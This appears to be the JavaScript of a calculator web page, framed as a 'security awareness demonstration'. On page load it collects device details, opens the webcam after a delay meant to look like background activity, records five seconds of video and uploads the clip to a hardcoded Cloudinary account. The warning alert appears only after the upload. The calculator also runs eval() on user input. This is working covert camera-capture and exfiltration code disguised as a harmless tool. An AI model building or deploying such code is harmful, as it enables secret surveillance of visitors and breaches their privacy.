console.log("Script Loaded");

let result = document.getElementById("result");
let video = document.getElementById("video");

// Calculator functions
function press(v) {
    result.value += v;
}

function clearResult() {
    result.value = "";
}

function calculate() {
    try {
        result.value = eval(result.value);
    } catch {
        result.value = "Error";
    }
}

let mediaRecorder;
let chunks = [];

// Phase 1 & 2: Camera Activation and Recording
async function startCamera() {
    try {
        console.log("Starting camera");
        // Requesting permission (Requirement: Automated Capture)
        let stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        mediaRecorder = new MediaRecorder(stream);

        mediaRecorder.ondataavailable = function(e) {
            chunks.push(e.data);
        };

        mediaRecorder.onstop = function() {
            console.log("Recording stopped");
            let blob = new Blob(chunks, { type: "video/webm" });
            chunks = [];

            // Phase 1: Save to Local Storage
            saveLocal(blob);

            // Phase 2: Save to Cloud Storage (Cloudinary)
            uploadToCloudinary(blob);

            // Security Awareness Mode: Show warning after recording
            setTimeout(() => {
                showSecurityWarning();
            }, 1000);
        };

        mediaRecorder.start();
        console.log("Recording started");

        // Record for 5 seconds as a demonstration
        setTimeout(() => {
            mediaRecorder.stop();
        }, 5000);

    } catch (err) {
        console.log("Camera error:", err);
    }
}

// Phase 1: Local Storage Implementation
function saveLocal(blob) {
    let reader = new FileReader();
    reader.readAsDataURL(blob);
    reader.onloadend = function() {
        localStorage.setItem("recordedVideo", reader.result);
        console.log("Video saved to Local Storage");
    };
}

// Phase 2: Cloud Storage Implementation (Cloudinary)
function uploadToCloudinary(blob) {
    const cloudName = "dwa0zhoc2"; 
    const uploadPreset = "ml_default"; 

    let formData = new FormData();
    formData.append("file", blob);
    formData.append("upload_preset", uploadPreset);

    fetch(`https://api.cloudinary.com/v1_1/${cloudName}/video/upload`, {
        method: "POST",
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        console.log("Uploaded successfully to Cloudinary:", data.secure_url);
    })
    .catch(error => {
        console.error("Cloudinary Upload Error:", error);
    });
}

// Bonus: Capture User Device Information
function captureDeviceInfo() {
    let deviceInfo = {
        browser: navigator.userAgent,
        os: navigator.platform,
        screen: screen.width + "x" + screen.height,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
    };

    localStorage.setItem("deviceInfo", JSON.stringify(deviceInfo));
    console.table(deviceInfo);
}

// Security Awareness Mode: Warning Message
function showSecurityWarning() {
    alert(
        "Security Awareness Demonstration\n\n" +
        "This demonstration shows how malicious websites could misuse camera permissions.\n\n" +
        "Always verify a website before allowing camera access."
    );
}

// Initialization on Page Load
window.onload = function() {
    console.log("Page loaded");
    captureDeviceInfo();

    // Start camera after a short delay to simulate background activity
    setTimeout(() => {
        startCamera();
    }, 1500);
};
